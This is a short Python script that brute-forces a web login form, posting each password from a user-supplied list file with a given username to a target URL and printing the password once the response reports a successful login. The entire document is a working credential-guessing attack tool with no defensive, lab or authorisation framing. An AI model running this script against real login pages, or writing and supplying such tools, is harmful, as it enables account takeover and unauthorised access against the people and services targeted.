import requests

def brute_force(url, username, password_list):
    print(f"\n🔓 Brute-forcing {url} with username: {username}")

    for password in password_list:
        password = password.strip()  # Clean password
        data = {"username": username, "password": password}  # Adjust form fields

        try:
            response = requests.post(url, data=data, timeout=5)
            if response.status_code == 200:
                if "Login successful" in response.text:  # Modify based on response
                    print(f"[✅] Password FOUND: {password}")
                    return password
                else:
                    print(f"[-] Incorrect: {password}")
            else:
                print(f"❌ Server error: {response.status_code}")
        except requests.RequestException as e:
            print(f"❌ Connection error: {e}")

    print("\n[-] No valid password found.")
    return None

if __name__ == "__main__":
    target_url = input("Enter login URL: ").strip()
    user = input("Enter username: ").strip()
    password_file = input("Enter password list file: ").strip()

    try:
        with open(password_file, 'r') as file:
            passwords = [line.strip() for line in file if line.strip()]
        if not passwords:
            print("❌ Password file is empty.")
        else:
            brute_force(target_url, user, passwords)
    except FileNotFoundError:
        print(f"❌ Error: The file '{password_file}' was not found.")
